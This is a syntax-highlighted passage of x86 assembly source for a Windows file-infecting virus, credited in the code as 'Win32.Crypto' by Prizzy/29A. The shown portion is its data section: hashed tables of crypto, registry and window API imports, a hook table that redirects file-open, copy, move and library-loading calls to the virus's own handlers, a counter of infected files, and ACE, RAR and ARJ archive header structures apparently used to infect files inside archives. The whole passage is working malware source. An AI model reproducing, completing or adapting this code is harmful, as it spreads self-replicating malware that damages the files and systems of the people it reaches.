</span><span class="sc5">szCryptDecrypt</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CryptDecrypt</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCryptDestroyKey</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CryptDestroyKey</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCryptReleaseContext</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CryptReleaseContext</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szRegOpenKeyExA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RegOpenKeyExA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szRegQueryValueExA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RegQueryValueExA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szRegQueryInfoKeyA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RegQueryInfoKeyA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szRegEnumValueA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RegEnumValueA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szRegSetValueExA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RegSetValueExA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szRegCreateKeyExA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RegCreateKeyExA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szRegCloseKey</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RegCloseKey</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"USER32.DLL"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">user32_name</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">szSetTimer</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SetTimer</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szKillTimer</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">KillTimer</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szFindWindowA</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FindWindowA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szPostMessageA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PostMessageA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCharUpperBuffA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CharUpperBuffA</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;end of table</span><span class="sc0">

    </span><span class="sc5">Hooked_API_functions</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;1st value = orig. adr ... 2nd = new function</span><span class="sc0">
</span><span class="sc5">hfCreateFileW</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myCreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myCreateFileW</span><span class="sc0">
</span><span class="sc5">hfCreateFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myOpenFile</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myCreateFileA</span><span class="sc0">
</span><span class="sc5">hfOpenFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_lopen</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myOpenFile</span><span class="sc0">
</span><span class="sc5">hf_lopen</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myCopyFileW</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_lopen</span><span class="sc0">

</span><span class="sc5">hfCopyFileW</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myCopyFileA</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myCopyFileW</span><span class="sc0">
</span><span class="sc5">hfCopyFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myMoveFileW</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myCopyFileA</span><span class="sc0">
</span><span class="sc5">hfMoveFileW</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myMoveFileA</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myMoveFileW</span><span class="sc0">
</span><span class="sc5">hfMoveFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myMoveFileExW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myMoveFileA</span><span class="sc0">
</span><span class="sc5">hfMoveFileExW</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myMoveFileExA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myMoveFileExW</span><span class="sc0">
</span><span class="sc5">hfMoveFileExA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myLoadLibraryW</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myMoveFileExA</span><span class="sc0">

</span><span class="sc5">hfLoadLibraryW</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myLoadLibraryA</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myLoadLibraryW</span><span class="sc0">
</span><span class="sc5">hfLoadLibraryA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myLoadLibraryExW</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myLoadLibraryA</span><span class="sc0">
</span><span class="sc5">hfLoadLibraryExW</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myLoadLibraryExA</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myLoadLibraryExW</span><span class="sc0">
</span><span class="sc5">hfLoadLibraryExA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myFreeLibrary</span><span class="sc0">     </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myLoadLibraryExA</span><span class="sc0">
</span><span class="sc5">hfFreeLibrary</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndOfNewFunctions</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myFreeLibrary</span><span class="sc0">

        </span><span class="sc1">; common valuez</span><span class="sc0">

</span><span class="sc5">gdt_flags</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;fixed &amp; remote disks</span><span class="sc0">
</span><span class="sc5">file_infected</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;number of infected files</span><span class="sc0">

        </span><span class="sc1">; copyright</span><span class="sc0">

</span><span class="sc5">szAuthor</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Win32.Crypto, (c)oded by Prizzy/29A"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Greetz to Darkman, Benny and GriYo"</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ archivez struct ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">; ACE,RAR SFX information</span><span class="sc0">

</span><span class="sc5">Archive_MagicWhere</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc5">ACE_MagicWhere</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">ACENeededBytes</span><span class="sc1">;ACE archive (*.ACE)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">05C00h</span><span class="sc4">,</span><span class="sc2">300h</span><span class="sc0"> </span><span class="sc1">;ACE-SFX (DOS)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0DE00h</span><span class="sc4">,</span><span class="sc2">2200h</span><span class="sc0">    </span><span class="sc1">;ACE-SFX English/German</span><span class="sc0">
                        </span><span class="sc1">;(Win 95/98, NT 4.x)</span><span class="sc0">

  </span><span class="sc5">RAR_MagicWhere</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">        </span><span class="sc1">;RAR archive (*.RAR)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2400h</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">  </span><span class="sc1">;RAR-SFX (DOS)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">5000h</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">  </span><span class="sc1">;RAR-SFX (Win 95/98, NT 4.x)</span><span class="sc0">

  </span><span class="sc5">ACE_Magic</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'**ACE**'</span><span class="sc0">
  </span><span class="sc5">ACE_Magic_Length</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc0">
  </span><span class="sc5">RAR_Magic</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Rar!'</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">RAR_Magic_Length</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc0">

        </span><span class="sc1">; ACE archivez struct</span><span class="sc0">

</span><span class="sc5">ACE_h_struct</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
  </span><span class="sc5">ACEhHeadCrc</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ACEhHeadSize</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ACEhHeadType</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ACEhHeadFlags</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ACEhSignature</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'**ACE**'</span><span class="sc0">
</span><span class="sc5">ACE_h_struct_finish</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">ACE_h_struct_continue</span><span class="sc0">   </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;this structure ain't</span><span class="sc0">
  </span><span class="sc5">ACEhVerMod</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;neccessary for RAR's</span><span class="sc0">
  </span><span class="sc5">ACEhVerCr</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;opeartions</span><span class="sc0">
  </span><span class="sc5">ACEhHostCr</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ACEhVolumeNumber</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ACEhTimeDate</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ACEhReserved1</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ACEhReserved2</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ACEhReserved3</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ACEhAvSize</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ACEhAv</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ThisPlace</span><span class="sc0">
  </span><span class="sc5">ACEhCommentSize</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ACEhComment</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ThisPlace</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">ACE_f_struct</span><span class="sc0">        </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;this structure ain't</span><span class="sc0">
  </span><span class="sc5">ACEfHeadCRC</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;neccessary for RAR's</span><span class="sc0">
  </span><span class="sc5">ACEfHeadSize</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;opeartions</span><span class="sc0">
  </span><span class="sc5">ACEfHeadType</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ACEfHeadFlags</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ACEfCompressedSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ACEfUnCompressedSize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ACEfTimeDate</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ACEfAttrib</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ACEfCRC32</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ACEfTechType</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ACEfTechQual</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ACEfTechParm</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ACEfReserved</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ACEfFilenameSize</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ACEfFilename</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">ACENeededBytes</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ACE_h_struct_finish</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ACE_h_struct</span><span class="sc0">

        </span><span class="sc1">; RAR archivez struct</span><span class="sc0">

  </span><span class="sc5">RARSignature</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Rar!'</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;RAR's signature (v1.5+)</span><span class="sc0">
  </span><span class="sc5">RARSignature_Length</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc0">          </span><span class="sc1">;seven bytes</span><span class="sc0">

</span><span class="sc5">RAR_struct</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
  </span><span class="sc5">RARHeaderCRC</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">RARHeaderType</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">RARFileFlags</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">RARHeaderSize</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">RAR_struct_finish</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">RAR_struct_continue</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;this structure ain't</span><span class="sc0">
  </span><span class="sc5">RARCompressedSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">        </span><span class="sc1">;neccessary for RAR's</span><span class="sc0">
  </span><span class="sc5">RARUncompressedSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">        </span><span class="sc1">;opeartions</span><span class="sc0">
  </span><span class="sc5">RARHostOS</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">RARFileCRC</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">RARDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">RARVersionNeed</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">RARMethod</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">RARFileNameSize</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">RARFileAttribute</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">RARFileName</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">RARNeededBytes</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">RAR_struct_finish</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">RAR_struct</span><span class="sc0">

        </span><span class="sc1">; ARJ archivez struct</span><span class="sc0">

</span><span class="sc5">ARJ_struct</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
  </span><span class="sc5">ARJHeaderId</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0EA60h</span><span class="sc0">
  </span><span class="sc5">ARJHeaderSize</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ARJ1HeaderSize</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ARJVersionDone</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ARJVersionNeed</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ARJHostOS</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ARJFlags</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ARJMethod</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ARJType</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ARJReserved</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">ARJDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">ARJCompressedSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ARJ_struct_finish</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">ARJ_struct_continue</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;this structure ain't</span><span class="sc0">
  </span><span class="sc5">ARJUncompressedSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;neccessary for ARJ's</span><span class="sc0">
  </span><span class="sc5">ARJFileCRC</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;opeartions</span><span class="sc0">
  </span><span class="sc5">ARJEntryname</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ARJAccessMode</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ARJHostData</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
  </span><span class="sc5">ARJFilename</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;from this it isn't exact,</span><span class="sc0">
  </span><span class="sc5">ARJComment</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;ARJFilename has not 8+1+3</span><span class="sc0">
  </span><span class="sc5">ARJHeaderCRC</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;size</span><span class="sc0">
  </span><span class="sc5">ARJExtHeader</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
